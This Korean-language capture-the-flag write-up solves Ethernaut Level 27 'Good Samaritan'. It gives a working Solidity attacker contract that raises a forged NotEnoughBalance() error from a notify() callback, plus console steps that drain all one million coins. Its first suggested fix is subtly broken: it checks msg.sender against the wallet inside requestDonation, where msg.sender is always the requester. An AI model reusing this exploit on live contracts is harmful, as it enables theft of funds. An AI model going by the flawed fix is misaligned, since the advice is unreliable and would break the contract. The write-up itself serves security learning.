# Ethernaut Level 27: Good Samaritan - Writeup

## 문제 개요

Good Samaritan은 선량한 기부자로, 요청하는 사람에게 코인을 기부하는
컨트랙트입니다.\
총 **1,000,000개 코인**을 보유하고 있으며, 기본적으로는 한 번에 10개씩만
기부합니다.\
하지만 잔액이 부족하면 남은 모든 코인을 전송하는 특별한 로직이
존재합니다.

**목표**: GoodSamaritan의 모든 잔액 탈취

------------------------------------------------------------------------

## 컨트랙트 구조 분석

### GoodSamaritan 컨트랙트

``` solidity
function requestDonation() external returns (bool enoughBalance) {
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

### Wallet 컨트랙트

``` solidity
function donate10(address dest_) external onlyOwner {
    if (coin.balances(address(this)) < 10) {
        revert NotEnoughBalance();
    } else {
        coin.transfer(dest_, 10);
    }
}

function transferRemainder(address dest_) external onlyOwner {
    coin.transfer(dest_, coin.balances(address(this)));
}
```

### Coin 컨트랙트

``` solidity
function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];
    
    if (amount_ <= currentBalance) {
        balances[msg.sender] -= amount_;
        balances[dest_] += amount_;
        
        if (dest_.isContract()) {
            INotifyable(dest_).notify(amount_);  // 핵심!
        }
    } else {
        revert InsufficientBalance(currentBalance, amount_);
    }
}
```

------------------------------------------------------------------------

## 취약점 분석

### 핵심 취약점: Custom Error 조작

-   `NotEnoughBalance()` 에러가 발생하면 GoodSamaritan은 잔액 부족으로
    오해\
-   이 에러는 Wallet에서만 발생해야 하지만 **notify() 함수에서 직접 발생
    가능**\
-   공격자는 `notify()`에서 가짜 `NotEnoughBalance()` 에러를 발생시켜
    `transferRemainder()` 실행 유도 가능

------------------------------------------------------------------------

## 공격 시나리오

1.  `requestDonation()` 호출\
2.  `wallet.donate10()` 실행 (잔액 충분)\
3.  `coin.transfer(10)` 실행\
4.  `notify(10)` 호출 시 **가짜 NotEnoughBalance 에러 발생**\
5.  GoodSamaritan이 잔액 부족으로 오해 → `transferRemainder()` 실행\
6.  모든 코인 탈취

------------------------------------------------------------------------

## 공격 구현

### 공격 컨트랙트

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract AttackGoodSamaritan {
    error NotEnoughBalance();  // 가짜 에러 정의
    
    IGoodSamaritan public goodSamaritan;
    ICoin public coin;
    
    constructor(address _goodSamaritan, address _coin) {
        goodSamaritan = IGoodSamaritan(_goodSamaritan);
        coin = ICoin(_coin);
    }
    
    function attack() external {
        goodSamaritan.requestDonation();
    }
    
    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
    
    function checkBalance() external view returns (uint256) {
        return coin.balances(address(this));
    }
}
```

### 핵심 로직 설명

-   **에러 타이밍**: amount == 10일 때만 에러 발생\
-   첫 번째 `donate10()` 호출 시 에러 발생 → GoodSamaritan 속임\
-   두 번째 `transferRemainder()`에서는 에러 없음 → 모든 코인 수령

------------------------------------------------------------------------

## 공격 실행 과정

1.  **환경 정보 수집**

``` javascript
console.log("GoodSamaritan:", contract.address);
const coinAddress = await contract.coin();
const walletAddress = await contract.wallet();
const balance = await coin.methods.balances(walletAddress).call();
console.log("Initial balance:", balance); // 1000000
```

2.  **공격 컨트랙트 배포**

-   AttackGoodSamaritan 배포 (파라미터: GoodSamaritan 주소, Coin 주소)

3.  **공격 실행**

``` javascript
await attackContract.methods.attack().send({from: player});
```

4.  **결과 확인**

``` javascript
const stolenBalance = await attackContract.methods.checkBalance().call();
console.log("Stolen coins:", stolenBalance); // 1000000

const remainingBalance = await coin.methods.balances(walletAddress).call();
console.log("Remaining balance:", remainingBalance); // 0
```

------------------------------------------------------------------------

## 공격 성공 결과

-   탈취한 코인: **1,000,000개 (전체 잔액)**\
-   지갑 잔액: **0개**\
-   공격 트랜잭션: **1회 호출로 모든 자금 탈취 성공**

------------------------------------------------------------------------

## 취약점 분석 및 교훈

### 1. Custom Error의 위험성

-   Solidity 0.8.4에서 도입된 기능\
-   가스 효율적이지만, 보안 검증 없이 사용 시 위험\
-   에러 발생 소스를 반드시 검증해야 함

### 2. 신뢰하지 않는 컨트랙트와의 상호작용

-   `notify()` 콜백을 통한 조작 공격 가능\
-   외부 컨트랙트 발생 에러를 그대로 신뢰하는 것은 위험

### 3. 에러 처리 로직의 문제

``` solidity
catch (bytes memory err) {
    if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
        // 에러 소스 검증 없음 → 취약
    }
}
```

------------------------------------------------------------------------

## 보안 개선 방안

### 1. 에러 소스 검증

``` solidity
catch (bytes memory err) {
    if (msg.sender == address(wallet) &&
        keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
        // 안전한 처리
    }
}
```

### 2. 상태 기반 검증

``` solidity
if (coin.balances(address(wallet)) < 10) {
    wallet.transferRemainder(msg.sender);
}
```

### 3. 재진입 방지

-   OpenZeppelin `ReentrancyGuard` 사용\
-   Checks-Effects-Interactions 패턴 적용

------------------------------------------------------------------------

## 결론

Good Samaritan 문제는 **Custom Error 시스템과 외부 컨트랙트 상호작용의
보안 문제**를 잘 보여준다.

### 배운 교훈

-   외부 입력과 에러는 항상 검증해야 함\
-   Custom Error 사용 시 보안적 고려 필요\
-   에러 기반 로직보다는 상태 기반 검증이 안전

→ **보안에 취약한 에러 처리 로직은 자금 전액 탈취로 이어질 수 있음**
